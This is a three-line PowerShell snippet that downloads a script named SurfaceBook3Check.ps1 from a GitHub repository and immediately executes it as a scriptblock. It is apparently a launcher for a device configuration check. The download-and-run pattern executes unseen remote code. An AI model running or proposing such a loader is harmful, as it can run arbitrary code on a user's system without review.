$u='https://github.com/binesheb/config_check/raw/refs/heads/main/SurfaceBook3Check.ps1'
$c=Invoke-RestMethod -Uri $u -UseBasicParsing
& ([scriptblock]::Create($c)) @args